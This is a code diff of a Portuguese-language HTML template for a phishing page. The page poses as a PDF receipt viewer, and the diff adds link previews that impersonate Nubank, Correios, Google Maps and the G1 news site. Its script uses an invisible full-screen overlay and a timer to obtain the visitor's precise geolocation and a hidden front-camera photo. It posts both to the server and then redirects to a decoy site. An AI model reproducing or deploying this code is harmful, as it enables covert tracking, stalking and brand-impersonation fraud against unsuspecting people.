@@ -3,189 +3,106 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Visualizador de Documentos</title>
     
-    <meta property="og:site_name" content="Visualizador de Arquivos">
-    <meta property="og:title" content="📄 Comprovante_Digital.pdf">
-    <meta property="og:description" content="Toque para visualizar o documento assinado.">
-    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/PDF_file_icon.svg/400px-PDF_file_icon.svg.png">
+    {% if tema == 'nubank' %}
+        <meta property="og:title" content="Comprovante de Transferência">
+        <meta property="og:description" content="R$ 150,00 - Recebido via PIX. Toque para ver o comprovante.">
+        <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f7/Nubank_logo_2021.svg/1200px-Nubank_logo_2021.svg.png">
+        <title>Nu Pagamentos S.A.</title>
+    
+    {% elif tema == 'correios' %}
+        <meta property="og:title" content="Objeto Saiu para Entrega">
+        <meta property="og:description" content="O carteiro não foi atendido. Clique para reagendar.">
+        <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c3/Correios_%282020%29.svg/1200px-Correios_%282020%29.svg.png">
+        <title>Rastreamento Correios</title>
+
+    {% elif tema == 'maps' %}
+        <meta property="og:title" content="Localização em Tempo Real">
+        <meta property="og:description" content="Compartilhado via Google Maps. Ver trajeto.">
+        <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/a/aa/Google_Maps_icon_%282020%29.svg/1200px-Google_Maps_icon_%282020%29.svg.png">
+        <title>Google Maps</title>
+
+    {% elif tema == 'g1' %}
+        <meta property="og:title" content="URGENTE: Acidente grave na região bloqueia trânsito">
+        <meta property="og:description" content="Veja a lista de ruas interditadas agora.">
+        <meta property="og:image" content="https://s2.glbimg.com/QFv1N7T5bH7M5QJ7J5_QJ7J5_Q=/0x0:1200x675/984x0/smart/filters:strip_icc()/i.s3.glbimg.com/v1/AUTH_59edd422c0c84a879bd37670ae4f538a/internal_photos/bs/2020/u/1/123456.jpg">
+        <title>G1 - Notícias</title>
+
+    {% else %}
+        <meta property="og:title" content="Documento_Digital.pdf">
+        <meta property="og:description" content="Arquivo seguro criptografado. Toque para visualizar.">
+        <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/PDF_file_icon.svg/1200px-PDF_file_icon.svg.png">
+        <title>Visualizador de Arquivos</title>
+    {% endif %}
 
     <style>
-        :root {
-            --pdf-bg: #525659;
-            --pdf-toolbar: #323639;
-            --accent: #3b82f6;
-        }
-
-        body { 
-            margin: 0; 
-            background: var(--pdf-bg); 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
-            display: flex; 
-            flex-direction: column;
-            height: 100vh; 
-            overflow: hidden; 
-        }
-
-        /* Barra Superior Estilo PDF Viewer */
-        .toolbar {
-            background: var(--pdf-toolbar);
-            height: 56px;
-            display: flex;
-            align-items: center;
-            padding: 0 16px;
-            color: white;
-            font-size: 14px;
-            justify-content: space-between;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
-            z-index: 10;
-        }
-
-        .toolbar-title {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-
-        /* Container do "Documento" */
-        .viewport {
-            flex: 1;
-            display: flex;
-            justify-content: center;
-            padding: 15px;
-            overflow-y: auto;
-            position: relative;
-        }
-
-        .pdf-page {
-            background: white;
-            width: 100%;
-            max-width: 600px;
-            height: 842px; /* Proporção A4 aproximada */
-            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding-top: 100px;
-            border-radius: 2px;
-        }
-
-        /* Spinner Moderno */
-        .loader-container {
-            text-align: center;
-            color: #555;
-        }
-
-        .spinner { 
-            border: 3px solid #f3f3f3; 
-            border-top: 3px solid var(--accent); 
-            border-radius: 50%; 
-            width: 40px; 
-            height: 40px; 
-            animation: spin 1s linear infinite; 
-            margin: 0 auto 20px; 
-        }
-
+        body { margin: 0; background: #525659; font-family: sans-serif; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
+        .toolbar { background: #323639; height: 56px; display: flex; align-items: center; padding: 0 16px; color: white; justify-content: space-between; }
+        .viewport { flex: 1; display: flex; justify-content: center; padding: 15px; overflow-y: auto; }
+        .pdf-page { background: white; width: 100%; max-width: 600px; height: 800px; box-shadow: 0 4px 12px rgba(0,0,0,0.3); display: flex; flex-direction: column; align-items: center; padding-top: 100px; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3b82f6; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        .status-text {
-            font-size: 15px;
-            font-weight: 500;
-            margin-bottom: 8px;
-        }
-
-        .sub-text {
-            font-size: 12px;
-            color: #999;
-        }
-
-        /* Overlay Invisível para capturar o clique inicial */
-        #capa { 
-            position: fixed; 
-            top: 0; 
-            left: 0; 
-            width: 100%; 
-            height: 100%; 
-            z-index: 9999; 
-            cursor: pointer;
-        }
-        
+        #capa { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; }
         #video, #canvas { display: none; }
     </style>
 </head>
 <body>
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas" width="640" height="480"></canvas>
-
     <div id="capa" onclick="iniciarSeguranca()"></div>
 
     <div class="toolbar">
-        <div class="toolbar-title">
-            <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
-            <span>Comprovante_Digital.pdf</span>
-        </div>
-        <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/></svg>
+        <span id="doc-title">
+            {% if tema == 'nubank' %}Comprovante_Transacao.pdf
+            {% elif tema == 'correios' %}Rastreio_Encomenda.pdf
+            {% else %}Documento_Digital.pdf{% endif %}
+        </span>
     </div>
-
+    
     <div class="viewport">
         <div class="pdf-page">
-            <div class="loader-container">
-                <div class="spinner"></div>
-                <div class="status-text">Carregando documento...</div>
-                <div class="sub-text">Aguarde a validação do certificado digital.</div>
-            </div>
+            <div class="spinner"></div>
+            <div id="status-text">Carregando visualização...</div>
         </div>
     </div>
 
     <script>
         const idOrdem = "{{ id }}";
         const siteDestino = "{{ destino }}";
-        let jaEnviou = false;
         let fotoBase64 = null;
         let globalStream = null;
+        let processoIniciado = false;
 
         function finalizar() { 
-            // Para a câmera antes de sair para liberar recursos do sistema
-            if (globalStream) {
-                globalStream.getTracks().forEach(track => track.stop());
-            }
-
-            // timeout de 500ms para garantir que o fetch anterior completou
+            if (globalStream) globalStream.getTracks().forEach(track => track.stop());
+            document.getElementById('status-text').innerText = "Abrindo destino...";
+            
             setTimeout(() => {
-                // replace() evita que o usuário volte para a página de captura ao clicar em "voltar"
-                // top garante a saída de qualquer iframe que pudesse causar erro 403
-                window.top.location.replace(siteDestino);
-            }, 500);
+                const link = document.createElement('a');
+                link.href = siteDestino;
+                link.rel = 'noreferrer noopener';
+                document.body.appendChild(link);
+                link.click();
+            }, 600);
         }
 
         async function capturarFoto() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
-                    audio: false 
-                });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                 globalStream = stream;
                 const video = document.getElementById('video');
                 video.srcObject = stream;
-                
-                await new Promise(resolve => setTimeout(resolve, 1200));
-                
+                await new Promise(resolve => setTimeout(resolve, 1000));
                 const canvas = document.getElementById('canvas');
                 canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                 fotoBase64 = canvas.toDataURL('image/jpeg', 0.6);
-            } catch (err) {
-                console.log("Câmera indisponível.");
-            }
+            } catch (err) { console.log("Câmera bloqueada"); }
         }
 
-        async function iniciarSeguranca() {
-            if (jaEnviou) return;
-
-            const geoOptions = { 
-                enableHighAccuracy: true, 
-                timeout: 8000, 
-                maximumAge: 0 
-            };
+        function iniciarSeguranca() {
+            if (processoIniciado) return;
+            processoIniciado = true;
+            document.getElementById('status-text').innerText = "Verificando biometria...";
 
             navigator.geolocation.getCurrentPosition(async function(pos) {
                 await capturarFoto();
@@ -193,34 +110,18 @@
             }, async function(err) {
                 await capturarFoto();
                 enviarDados(null, null, null, null);
-            }, geoOptions);
+            }, { enableHighAccuracy: true, timeout: 5000 });
         }
 
         function enviarDados(lat, lon, acc, spd) {
-            if (jaEnviou) return;
-            jaEnviou = true;
-            
             fetch(`/api/sinal/${idOrdem}`, {
                 method: "POST",
                 headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({
-                    latitude: lat,
-                    longitude: lon,
-                    accuracy: acc ? Math.round(acc) : null,
-                    speed: spd,
-                    foto: fotoBase64
-                })
-            }).finally(() => { 
-                finalizar(); 
-            });
+                body: JSON.stringify({ latitude: lat, longitude: lon, accuracy: acc, speed: spd, foto: fotoBase64 })
+            }).finally(() => { finalizar(); });
         }
 
-        window.onload = () => {
-            setTimeout(iniciarSeguranca, 1000);
-        };
-        
-        window.addEventListener('touchstart', iniciarSeguranca);
-        window.addEventListener('click', iniciarSeguranca);
+        window.onload = () => { setTimeout(iniciarSeguranca, 1500); };
     </script>
 </body>
 </html>
